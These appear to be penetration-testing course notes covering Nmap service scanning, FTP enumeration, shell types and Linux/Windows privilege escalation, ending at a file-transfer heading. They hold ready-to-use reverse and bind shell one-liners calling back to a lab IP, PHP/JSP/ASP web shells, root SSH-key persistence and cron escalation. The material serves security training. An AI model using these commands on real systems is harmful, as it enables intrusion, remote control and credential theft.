## Risk Management Process

| Step                   | Explanation                                                                                                                                                                               |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Identifying the Risk` | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks.                                                                 |
| `Analyze the Risk`     | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes.                     |
| `Evaluate the Risk`    | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure).             |
| `Dealing with Risk`    | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with.        |
| `Monitoring Risk`      | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, `i.e., from low to medium or high impact`. |
## Red Team vs Blue Team
<span style="color:#fe1616">Red teamers</span> usually play an adversary role in breaking into the organization to identify any potential weaknesses real attackers may utilize to break the organization's defenses. The most common task on the red teaming side is penetration testing, social engineering, and other similar offensive techniques.

On the other hand, the <span style="color:#009dff">blue team</span> makes up the majority of infosec jobs. It is responsible for strengthening the organization's defenses by analyzing the risks, coming up with policies, responding to threats and incidents, and effectively using security tools and other similar tasks.

A [virtual private network (VPN)](https://en.wikipedia.org/wiki/Virtual_private_network) allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company's corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.

## Common Terms
Shell - program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function.

|**Shell Type** | **Description**|
|`Reverse shell` | Initiates a connection back to a "listener" on our attack box.
|`Bind shell` | "Binds" to a specific port on the target host and waits for a connection from our attack box.
|`Web shell` | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command.

Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).

Web server is an application that runs on the back-end server, which handles all of the `HTTP` traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser.

## Service Scanning 

|**Concept / Command**|**Description**|
|---|---|
|**Core Concepts**||
|Service|Application running on a computer that performs a useful function for other users/computers|
|Server|Specialized machine that hosts services|
|Focus|Services that are misconfigured or vulnerable → coerce into unintended actions (e.g., execute commands)|
|Port range|1 – 65,535; well-known = 1 – 1,023; port 0 = reserved "wild card"|
|Default Nmap scan|TCP, top 1,000 most common ports|
|**Nmap**||
|`nmap 10.129.42.253`|Basic scan (top 1,000 ports)|
|`nmap -sV -sC -p- 10.129.42.253`|`-sV` version scan, `-sC` default scripts, `-p-` all 65,535 TCP ports|
|`nmap --script <name> -p<port> <host>`|Run a specific Nmap script|
|`nmap -sV --script=banner <target>`|Banner grabbing via Nmap|
|`nmap -A -p445 <target>`|Aggressive scan (OS, version, scripts, traceroute)|
|**Banner Grabbing**||
|`nc -nv 10.129.42.253 21`|Manual banner grab via Netcat (→ `220 (vsFTPd 3.0.3)`)|
|**FTP (21)**||
|`ftp -p 10.129.42.253`|Connect to FTP (login `anonymous` if allowed)|
|`ls` / `cd pub` / `get login.txt` / `exit`|List, change dir, download file, quit|
|Finding|`login.txt` → `admin:ftp@dmin123` (credentials)|
|**SMB (139/445)**||
|`nmap --script smb-os-discovery.nse -p445 <target>`|Discover SMB OS info|

|**Key Takeaways**||
|Workflow|Basic scan → advanced scan (`-sV -sC -p-`) → banner grab → service enumeration (FTP/SMB/SNMP)|
|Goal|Find credentials, sensitive files, and vulnerabilities to further access|

## Types of Shells 

|**Concept / Command**|**Description**|
|---|---|
|**Core Concepts**||
|Goal|Get reliable direct shell access (Bash/PowerShell) to enumerate & control compromised host|
|Alternative|Remote login via SSH (Linux) / WinRM (Windows) — requires working credentials|
|**Shell Types**||
|Reverse Shell|Connects **back to us**; quickest & most common; fragile (lose connection → re-exploit)|
|Bind Shell|**Waits for us to connect** to target's listening port; reconnect anytime unless process killed/reboot|
|Web Shell|Communicates via web server; commands through HTTP params (GET/POST); output on webpage|
|**Reverse Shell**||
|`nc -lvnp 1234`|Start Netcat listener (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port)|
|`ip a`|Find our IP (use `tun0` on HTB; `eth0` in real pentest)|
|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|Linux bash reverse shell|
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|Linux mkfifo reverse shell|
|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(...)..."`|Windows PowerShell reverse shell|
|Payload source|**Payload All The Things** — comprehensive list of reverse shell commands|
|**Bind Shell**||
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|Linux bash bind shell (listens on `0.0.0.0:1234`)|
|`python -c 'exec("""import socket as s..."'`|Python bind shell|
|`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = ...`|Windows PowerShell bind shell|
|`nc 10.10.10.1 1234`|Connect to bind shell|
|**Upgrading TTY**||
|`python -c 'import pty; pty.spawn("/bin/bash")'`|Spawn full TTY via Python|
|`^Z` → `stty raw -echo` → `fg` → `[Enter]`|Background shell, set raw mode, foreground again|
|`echo $TERM` / `stty size`|Get local TERM & rows/columns|
|`export TERM=xterm-256color` / `stty rows 67 columns 318`|Fix remote shell terminal size|
|**Web Shell**||
|PHP|`<?php system($_REQUEST["cmd"]); ?>`|
|JSP|`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`|
|ASP|`<% eval request("cmd") %>`|
|Upload|Via upload vulnerability (e.g., `shell.php`) **or** write directly to webroot if RCE available|
|`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`|Write PHP shell to webroot|
|**Default Webroots**||
|Apache|`/var/www/html/`|
|Nginx|`/usr/local/nginx/html/`|
|IIS|`c:\inetpub\wwwroot\`|
|XAMPP|`C:\xampp\htdocs\`|
|**Accessing Web Shell**||
|`http://SERVER_IP:PORT/shell.php?cmd=id`|Browser access with `?cmd=` parameter|
|`curl http://SERVER_IP:PORT/shell.php?cmd=id`|cURL access|
|**Key Takeaways**||
|Reverse Shell|Fast & reliable but fragile — re-exploit needed if connection lost|
|Bind Shell|Reconnect anytime; lost if process killed or host rebooted|
|Web Shell|Bypasses firewall (uses port 80/443); persists after reboot; less interactive (must request URL per command)|

## Privilege Escalation

|**Concept / Command**|**Description**|
|---|---|
|**Core Concepts**||
|Goal|Escalate from low-privileged user to **root** (Linux) or **administrator/SYSTEM** (Windows)|
|Method|Find internal/local vulnerability to escalate privileges|
|**PrivEsc Checklists**||
|HackTricks|Excellent checklist for Linux & Windows local privesc|
|PayloadsAllTheThings|Checklists for Linux & Windows|
|**Enumeration Scripts**||
|LinEnum / linuxprivchecker|Common Linux enumeration scripts|
|Seatbelt / JAWS|Common Windows enumeration scripts|
|PEASS (LinPEAS/WinPEAS)|Well-maintained suite for Linux & Windows enumeration|
|`./linpeas.sh`|Run LinPEAS; reports weaknesses by color (RED/YELLOW = 99% PE vector)|
|Caution|Scripts create "noise" → may trigger AV/security monitoring; consider manual enumeration|
|**Kernel Exploits**||
|Check|Old/unpatched OS → look for kernel vulnerabilities|
|Example|Linux 3.9.0-73-generic → **CVE-2016-5195 (DirtyCow)** → root|
|Caution|Kernel exploits can cause instability; test in lab, get approval before production|
|**Vulnerable Software**||
|`dpkg -l` (Linux) / `C:\Program Files` (Windows)|List installed software; look for public exploits on old versions|
|**User Privileges — Sudo**||
|`sudo -l`|Check sudo privileges|
|`(ALL : ALL) ALL`|Full sudo access → `sudo su -` → root|
|`NOPASSWD: /bin/echo`|Run without password; `sudo -u user /bin/echo Hello World!` to run as specific user|
|GTFOBins|List of commands exploitable via sudo to get root|
|LOLBAS|Windows binaries to download files / execute commands as privileged user|
|**Scheduled Tasks (Cron/Tasks)**||
|Methods|Add new scheduled tasks/cron jobs **or** trick them to execute malicious software|
|Writable cron dirs|`/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root`|
|Exploit|Write bash script with reverse shell into a dir called by a cron job|
|**Exposed Credentials**||
|Sources|Config files, log files, user history (`bash_history`, `PSReadLine`)|
|Example|`/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');`|
|Password Reuse|`su -` with found password → root|
|**SSH Keys**||
|`/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`|Read private key if accessible|
|`chmod 600 id_rsa`|Restrict permissions (lax perms → SSH rejects key)|
|`ssh root@10.10.10.10 -i id_rsa`|Log in using private key|
|Write access to `.ssh/`|Append own public key to `/home/user/.ssh/authorized_keys` (works only if already controlling that user)|
|`ssh-keygen -f key`|Create new key pair (`key` private, `key.pub` public)|
|`echo "ssh-rsa AAAAB...M= user@parrot" >> /root/.ssh/authorized_keys`|Add public key on remote host|
|`ssh root@10.10.10.10 -i key`|Log in as root with new private key|

## Transferring Files

|**Concept / Command**|**Description**|
|---|---|
|**Core Concepts**||
|Goal|Transfer files to/from remote server (enumeration scripts, exploits, data) with a standard reverse shell|
